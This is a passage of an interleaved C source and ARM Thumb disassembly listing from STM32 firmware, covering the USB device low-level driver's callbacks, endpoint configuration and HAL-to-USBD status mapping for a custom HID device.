#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c93a:	b580      	push	{r7, lr}
 800c93c:	b082      	sub	sp, #8
 800c93e:	af00      	add	r7, sp, #0
 800c940:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c942:	687b      	ldr	r3, [r7, #4]
 800c944:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c948:	4618      	mov	r0, r3
 800c94a:	f7fe fd7d 	bl	800b448 <USBD_LL_SOF>
}
 800c94e:	bf00      	nop
 800c950:	3708      	adds	r7, #8
 800c952:	46bd      	mov	sp, r7
 800c954:	bd80      	pop	{r7, pc}

0800c956 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c956:	b580      	push	{r7, lr}
 800c958:	b084      	sub	sp, #16
 800c95a:	af00      	add	r7, sp, #0
 800c95c:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c95e:	2301      	movs	r3, #1
 800c960:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c962:	687b      	ldr	r3, [r7, #4]
 800c964:	689b      	ldr	r3, [r3, #8]
 800c966:	2b02      	cmp	r3, #2
 800c968:	d001      	beq.n	800c96e <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c96a:	f7f4 f985 	bl	8000c78 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c96e:	687b      	ldr	r3, [r7, #4]
 800c970:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c974:	7bfa      	ldrb	r2, [r7, #15]
 800c976:	4611      	mov	r1, r2
 800c978:	4618      	mov	r0, r3
 800c97a:	f7fe fd21 	bl	800b3c0 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c97e:	687b      	ldr	r3, [r7, #4]
 800c980:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c984:	4618      	mov	r0, r3
 800c986:	f7fe fcc9 	bl	800b31c <USBD_LL_Reset>
}
 800c98a:	bf00      	nop
 800c98c:	3710      	adds	r7, #16
 800c98e:	46bd      	mov	sp, r7
 800c990:	bd80      	pop	{r7, pc}
	...

0800c994 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c994:	b580      	push	{r7, lr}
 800c996:	b082      	sub	sp, #8
 800c998:	af00      	add	r7, sp, #0
 800c99a:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c99c:	687b      	ldr	r3, [r7, #4]
 800c99e:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9a2:	4618      	mov	r0, r3
 800c9a4:	f7fe fd1c 	bl	800b3e0 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800c9a8:	687b      	ldr	r3, [r7, #4]
 800c9aa:	699b      	ldr	r3, [r3, #24]
 800c9ac:	2b00      	cmp	r3, #0
 800c9ae:	d005      	beq.n	800c9bc <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c9b0:	4b04      	ldr	r3, [pc, #16]	; (800c9c4 <HAL_PCD_SuspendCallback+0x30>)
 800c9b2:	691b      	ldr	r3, [r3, #16]
 800c9b4:	4a03      	ldr	r2, [pc, #12]	; (800c9c4 <HAL_PCD_SuspendCallback+0x30>)
 800c9b6:	f043 0306 	orr.w	r3, r3, #6
 800c9ba:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800c9bc:	bf00      	nop
 800c9be:	3708      	adds	r7, #8
 800c9c0:	46bd      	mov	sp, r7
 800c9c2:	bd80      	pop	{r7, pc}
 800c9c4:	e000ed00 	.word	0xe000ed00

0800c9c8 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9c8:	b580      	push	{r7, lr}
 800c9ca:	b082      	sub	sp, #8
 800c9cc:	af00      	add	r7, sp, #0
 800c9ce:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800c9d0:	687b      	ldr	r3, [r7, #4]
 800c9d2:	699b      	ldr	r3, [r3, #24]
 800c9d4:	2b00      	cmp	r3, #0
 800c9d6:	d007      	beq.n	800c9e8 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c9d8:	4b08      	ldr	r3, [pc, #32]	; (800c9fc <HAL_PCD_ResumeCallback+0x34>)
 800c9da:	691b      	ldr	r3, [r3, #16]
 800c9dc:	4a07      	ldr	r2, [pc, #28]	; (800c9fc <HAL_PCD_ResumeCallback+0x34>)
 800c9de:	f023 0306 	bic.w	r3, r3, #6
 800c9e2:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800c9e4:	f000 faf0 	bl	800cfc8 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800c9e8:	687b      	ldr	r3, [r7, #4]
 800c9ea:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9ee:	4618      	mov	r0, r3
 800c9f0:	f7fe fd12 	bl	800b418 <USBD_LL_Resume>
}
 800c9f4:	bf00      	nop
 800c9f6:	3708      	adds	r7, #8
 800c9f8:	46bd      	mov	sp, r7
 800c9fa:	bd80      	pop	{r7, pc}
 800c9fc:	e000ed00 	.word	0xe000ed00

0800ca00 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800ca00:	b580      	push	{r7, lr}
 800ca02:	b082      	sub	sp, #8
 800ca04:	af00      	add	r7, sp, #0
 800ca06:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800ca08:	f7f6 ff42 	bl	8003890 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800ca0c:	4a26      	ldr	r2, [pc, #152]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca0e:	687b      	ldr	r3, [r7, #4]
 800ca10:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800ca14:	687b      	ldr	r3, [r7, #4]
 800ca16:	4a24      	ldr	r2, [pc, #144]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca18:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800ca1c:	4b22      	ldr	r3, [pc, #136]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca1e:	4a23      	ldr	r2, [pc, #140]	; (800caac <USBD_LL_Init+0xac>)
 800ca20:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800ca22:	4b21      	ldr	r3, [pc, #132]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca24:	2208      	movs	r2, #8
 800ca26:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800ca28:	4b1f      	ldr	r3, [pc, #124]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca2a:	2202      	movs	r2, #2
 800ca2c:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ca2e:	4b1e      	ldr	r3, [pc, #120]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca30:	2202      	movs	r2, #2
 800ca32:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ca34:	4b1c      	ldr	r3, [pc, #112]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca36:	2200      	movs	r2, #0
 800ca38:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ca3a:	4b1b      	ldr	r3, [pc, #108]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca3c:	2200      	movs	r2, #0
 800ca3e:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800ca40:	4b19      	ldr	r3, [pc, #100]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca42:	2200      	movs	r2, #0
 800ca44:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800ca46:	4b18      	ldr	r3, [pc, #96]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca48:	2200      	movs	r2, #0
 800ca4a:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800ca4c:	4816      	ldr	r0, [pc, #88]	; (800caa8 <USBD_LL_Init+0xa8>)
 800ca4e:	f7f5 f8e7 	bl	8001c20 <HAL_PCD_Init>
 800ca52:	4603      	mov	r3, r0
 800ca54:	2b00      	cmp	r3, #0
 800ca56:	d001      	beq.n	800ca5c <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800ca58:	f7f4 f90e 	bl	8000c78 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800ca5c:	687b      	ldr	r3, [r7, #4]
 800ca5e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca62:	2318      	movs	r3, #24
 800ca64:	2200      	movs	r2, #0
 800ca66:	2100      	movs	r1, #0
 800ca68:	f7f6 fe31 	bl	80036ce <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800ca6c:	687b      	ldr	r3, [r7, #4]
 800ca6e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca72:	2358      	movs	r3, #88	; 0x58
 800ca74:	2200      	movs	r2, #0
 800ca76:	2180      	movs	r1, #128	; 0x80
 800ca78:	f7f6 fe29 	bl	80036ce <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800ca7c:	687b      	ldr	r3, [r7, #4]
 800ca7e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca82:	2398      	movs	r3, #152	; 0x98
 800ca84:	2200      	movs	r2, #0
 800ca86:	2181      	movs	r1, #129	; 0x81
 800ca88:	f7f6 fe21 	bl	80036ce <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800ca8c:	687b      	ldr	r3, [r7, #4]
 800ca8e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca92:	23d8      	movs	r3, #216	; 0xd8
 800ca94:	2200      	movs	r2, #0
 800ca96:	2101      	movs	r1, #1
 800ca98:	f7f6 fe19 	bl	80036ce <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800ca9c:	2300      	movs	r3, #0
}
 800ca9e:	4618      	mov	r0, r3
 800caa0:	3708      	adds	r7, #8
 800caa2:	46bd      	mov	sp, r7
 800caa4:	bd80      	pop	{r7, pc}
 800caa6:	bf00      	nop
 800caa8:	20000b7c 	.word	0x20000b7c
 800caac:	40006800 	.word	0x40006800

0800cab0 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800cab0:	b580      	push	{r7, lr}
 800cab2:	b084      	sub	sp, #16
 800cab4:	af00      	add	r7, sp, #0
 800cab6:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cab8:	2300      	movs	r3, #0
 800caba:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cabc:	2300      	movs	r3, #0
 800cabe:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cac0:	687b      	ldr	r3, [r7, #4]
 800cac2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cac6:	4618      	mov	r0, r3
 800cac8:	f7f5 f9b0 	bl	8001e2c <HAL_PCD_Start>
 800cacc:	4603      	mov	r3, r0
 800cace:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cad0:	7bbb      	ldrb	r3, [r7, #14]
 800cad2:	2b03      	cmp	r3, #3
 800cad4:	d816      	bhi.n	800cb04 <USBD_LL_Start+0x54>
 800cad6:	a201      	add	r2, pc, #4	; (adr r2, 800cadc <USBD_LL_Start+0x2c>)
 800cad8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cadc:	0800caed 	.word	0x0800caed
 800cae0:	0800caf3 	.word	0x0800caf3
 800cae4:	0800caf9 	.word	0x0800caf9
 800cae8:	0800caff 	.word	0x0800caff
    case HAL_OK :
      usb_status = USBD_OK;
 800caec:	2300      	movs	r3, #0
 800caee:	73fb      	strb	r3, [r7, #15]
    break;
 800caf0:	e00b      	b.n	800cb0a <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800caf2:	2303      	movs	r3, #3
 800caf4:	73fb      	strb	r3, [r7, #15]
    break;
 800caf6:	e008      	b.n	800cb0a <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800caf8:	2301      	movs	r3, #1
 800cafa:	73fb      	strb	r3, [r7, #15]
    break;
 800cafc:	e005      	b.n	800cb0a <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cafe:	2303      	movs	r3, #3
 800cb00:	73fb      	strb	r3, [r7, #15]
    break;
 800cb02:	e002      	b.n	800cb0a <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cb04:	2303      	movs	r3, #3
 800cb06:	73fb      	strb	r3, [r7, #15]
    break;
 800cb08:	bf00      	nop
  }
  return usb_status;
 800cb0a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb0c:	4618      	mov	r0, r3
 800cb0e:	3710      	adds	r7, #16
 800cb10:	46bd      	mov	sp, r7
 800cb12:	bd80      	pop	{r7, pc}

0800cb14 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cb14:	b580      	push	{r7, lr}
 800cb16:	b084      	sub	sp, #16
 800cb18:	af00      	add	r7, sp, #0
 800cb1a:	6078      	str	r0, [r7, #4]
 800cb1c:	4608      	mov	r0, r1
 800cb1e:	4611      	mov	r1, r2
 800cb20:	461a      	mov	r2, r3
 800cb22:	4603      	mov	r3, r0
 800cb24:	70fb      	strb	r3, [r7, #3]
 800cb26:	460b      	mov	r3, r1
 800cb28:	70bb      	strb	r3, [r7, #2]
 800cb2a:	4613      	mov	r3, r2
 800cb2c:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb2e:	2300      	movs	r3, #0
 800cb30:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb32:	2300      	movs	r3, #0
 800cb34:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cb36:	687b      	ldr	r3, [r7, #4]
 800cb38:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cb3c:	78bb      	ldrb	r3, [r7, #2]
 800cb3e:	883a      	ldrh	r2, [r7, #0]
 800cb40:	78f9      	ldrb	r1, [r7, #3]
 800cb42:	f7f5 fae1 	bl	8002108 <HAL_PCD_EP_Open>
 800cb46:	4603      	mov	r3, r0
 800cb48:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb4a:	7bbb      	ldrb	r3, [r7, #14]
 800cb4c:	2b03      	cmp	r3, #3
 800cb4e:	d817      	bhi.n	800cb80 <USBD_LL_OpenEP+0x6c>
 800cb50:	a201      	add	r2, pc, #4	; (adr r2, 800cb58 <USBD_LL_OpenEP+0x44>)
 800cb52:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb56:	bf00      	nop
 800cb58:	0800cb69 	.word	0x0800cb69
 800cb5c:	0800cb6f 	.word	0x0800cb6f
 800cb60:	0800cb75 	.word	0x0800cb75
 800cb64:	0800cb7b 	.word	0x0800cb7b
    case HAL_OK :
      usb_status = USBD_OK;
 800cb68:	2300      	movs	r3, #0
 800cb6a:	73fb      	strb	r3, [r7, #15]
    break;
 800cb6c:	e00b      	b.n	800cb86 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb6e:	2303      	movs	r3, #3
 800cb70:	73fb      	strb	r3, [r7, #15]
    break;
 800cb72:	e008      	b.n	800cb86 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb74:	2301      	movs	r3, #1
 800cb76:	73fb      	strb	r3, [r7, #15]
    break;
 800cb78:	e005      	b.n	800cb86 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb7a:	2303      	movs	r3, #3
 800cb7c:	73fb      	strb	r3, [r7, #15]
    break;
 800cb7e:	e002      	b.n	800cb86 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cb80:	2303      	movs	r3, #3
 800cb82:	73fb      	strb	r3, [r7, #15]
    break;
 800cb84:	bf00      	nop
  }
  return usb_status;
 800cb86:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb88:	4618      	mov	r0, r3
 800cb8a:	3710      	adds	r7, #16
 800cb8c:	46bd      	mov	sp, r7
 800cb8e:	bd80      	pop	{r7, pc}

0800cb90 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cb90:	b580      	push	{r7, lr}
 800cb92:	b084      	sub	sp, #16
 800cb94:	af00      	add	r7, sp, #0
 800cb96:	6078      	str	r0, [r7, #4]
 800cb98:	460b      	mov	r3, r1
 800cb9a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb9c:	2300      	movs	r3, #0
 800cb9e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cba0:	2300      	movs	r3, #0
 800cba2:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cba4:	687b      	ldr	r3, [r7, #4]
 800cba6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cbaa:	78fa      	ldrb	r2, [r7, #3]
 800cbac:	4611      	mov	r1, r2
 800cbae:	4618      	mov	r0, r3
 800cbb0:	f7f5 fb07 	bl	80021c2 <HAL_PCD_EP_Close>
 800cbb4:	4603      	mov	r3, r0
 800cbb6:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cbb8:	7bbb      	ldrb	r3, [r7, #14]
 800cbba:	2b03      	cmp	r3, #3
 800cbbc:	d816      	bhi.n	800cbec <USBD_LL_CloseEP+0x5c>
 800cbbe:	a201      	add	r2, pc, #4	; (adr r2, 800cbc4 <USBD_LL_CloseEP+0x34>)
 800cbc0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cbc4:	0800cbd5 	.word	0x0800cbd5
 800cbc8:	0800cbdb 	.word	0x0800cbdb
 800cbcc:	0800cbe1 	.word	0x0800cbe1
 800cbd0:	0800cbe7 	.word	0x0800cbe7
    case HAL_OK :
      usb_status = USBD_OK;
 800cbd4:	2300      	movs	r3, #0
 800cbd6:	73fb      	strb	r3, [r7, #15]
    break;
 800cbd8:	e00b      	b.n	800cbf2 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cbda:	2303      	movs	r3, #3
 800cbdc:	73fb      	strb	r3, [r7, #15]
    break;
 800cbde:	e008      	b.n	800cbf2 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cbe0:	2301      	movs	r3, #1
 800cbe2:	73fb      	strb	r3, [r7, #15]
    break;
 800cbe4:	e005      	b.n	800cbf2 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cbe6:	2303      	movs	r3, #3
 800cbe8:	73fb      	strb	r3, [r7, #15]
    break;
 800cbea:	e002      	b.n	800cbf2 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cbec:	2303      	movs	r3, #3
 800cbee:	73fb      	strb	r3, [r7, #15]
    break;
 800cbf0:	bf00      	nop
  }
  return usb_status;
 800cbf2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbf4:	4618      	mov	r0, r3
 800cbf6:	3710      	adds	r7, #16
 800cbf8:	46bd      	mov	sp, r7
 800cbfa:	bd80      	pop	{r7, pc}

0800cbfc <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbfc:	b580      	push	{r7, lr}
 800cbfe:	b084      	sub	sp, #16
 800cc00:	af00      	add	r7, sp, #0
 800cc02:	6078      	str	r0, [r7, #4]
 800cc04:	460b      	mov	r3, r1
 800cc06:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc08:	2300      	movs	r3, #0
 800cc0a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc0c:	2300      	movs	r3, #0
 800cc0e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cc10:	687b      	ldr	r3, [r7, #4]
 800cc12:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc16:	78fa      	ldrb	r2, [r7, #3]
 800cc18:	4611      	mov	r1, r2
 800cc1a:	4618      	mov	r0, r3
 800cc1c:	f7f5 fc66 	bl	80024ec <HAL_PCD_EP_Flush>
 800cc20:	4603      	mov	r3, r0
 800cc22:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc24:	7bbb      	ldrb	r3, [r7, #14]
 800cc26:	2b03      	cmp	r3, #3
 800cc28:	d816      	bhi.n	800cc58 <USBD_LL_FlushEP+0x5c>
 800cc2a:	a201      	add	r2, pc, #4	; (adr r2, 800cc30 <USBD_LL_FlushEP+0x34>)
 800cc2c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc30:	0800cc41 	.word	0x0800cc41
 800cc34:	0800cc47 	.word	0x0800cc47
 800cc38:	0800cc4d 	.word	0x0800cc4d
 800cc3c:	0800cc53 	.word	0x0800cc53
    case HAL_OK :
      usb_status = USBD_OK;
 800cc40:	2300      	movs	r3, #0
 800cc42:	73fb      	strb	r3, [r7, #15]
    break;
 800cc44:	e00b      	b.n	800cc5e <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc46:	2303      	movs	r3, #3
 800cc48:	73fb      	strb	r3, [r7, #15]
    break;
 800cc4a:	e008      	b.n	800cc5e <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc4c:	2301      	movs	r3, #1
 800cc4e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc50:	e005      	b.n	800cc5e <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc52:	2303      	movs	r3, #3
 800cc54:	73fb      	strb	r3, [r7, #15]
    break;
 800cc56:	e002      	b.n	800cc5e <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc58:	2303      	movs	r3, #3
 800cc5a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc5c:	bf00      	nop
  }
  return usb_status;
 800cc5e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc60:	4618      	mov	r0, r3
 800cc62:	3710      	adds	r7, #16
 800cc64:	46bd      	mov	sp, r7
 800cc66:	bd80      	pop	{r7, pc}

0800cc68 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc68:	b580      	push	{r7, lr}
 800cc6a:	b084      	sub	sp, #16
 800cc6c:	af00      	add	r7, sp, #0
 800cc6e:	6078      	str	r0, [r7, #4]
 800cc70:	460b      	mov	r3, r1
 800cc72:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc74:	2300      	movs	r3, #0
 800cc76:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc78:	2300      	movs	r3, #0
 800cc7a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cc7c:	687b      	ldr	r3, [r7, #4]
 800cc7e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc82:	78fa      	ldrb	r2, [r7, #3]
 800cc84:	4611      	mov	r1, r2
 800cc86:	4618      	mov	r0, r3
 800cc88:	f7f5 fb7c 	bl	8002384 <HAL_PCD_EP_SetStall>
 800cc8c:	4603      	mov	r3, r0
 800cc8e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc90:	7bbb      	ldrb	r3, [r7, #14]
 800cc92:	2b03      	cmp	r3, #3
 800cc94:	d816      	bhi.n	800ccc4 <USBD_LL_StallEP+0x5c>
 800cc96:	a201      	add	r2, pc, #4	; (adr r2, 800cc9c <USBD_LL_StallEP+0x34>)
 800cc98:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc9c:	0800ccad 	.word	0x0800ccad
 800cca0:	0800ccb3 	.word	0x0800ccb3
 800cca4:	0800ccb9 	.word	0x0800ccb9
 800cca8:	0800ccbf 	.word	0x0800ccbf
    case HAL_OK :
      usb_status = USBD_OK;
 800ccac:	2300      	movs	r3, #0
 800ccae:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb0:	e00b      	b.n	800ccca <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ccb2:	2303      	movs	r3, #3
 800ccb4:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb6:	e008      	b.n	800ccca <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ccb8:	2301      	movs	r3, #1
 800ccba:	73fb      	strb	r3, [r7, #15]
    break;
 800ccbc:	e005      	b.n	800ccca <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccbe:	2303      	movs	r3, #3
